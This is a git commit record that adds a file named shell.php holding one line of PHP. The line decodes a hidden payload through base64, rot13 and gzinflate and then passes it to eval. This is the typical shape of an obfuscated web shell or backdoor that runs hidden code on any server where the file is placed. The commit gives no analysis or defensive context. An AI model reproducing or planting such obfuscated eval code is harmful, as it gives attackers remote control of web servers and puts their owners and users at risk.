509aa8cdf5d5c65236d303b0ac2a947aedfd4324
SystemOfPekalongan <77189271+SystemOfPekalongan@users.noreply.github.com>
2021-01-09 03:49:41 -0500

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,3 @@
+<?php
+eval(str_rot13(gzinflate(str_rot13(base64_decode("LclaCoAgEAbQu7iqjUbbgjqKqDhff0tZKdnpI3X5azLHRalkQ/rMUswlMIezEAuuRwI8alEhLvrKVdM+sYT/9eEeusPm4XnbtMTOG0FFCj0x248aK0dd9y8=")))));
+ 
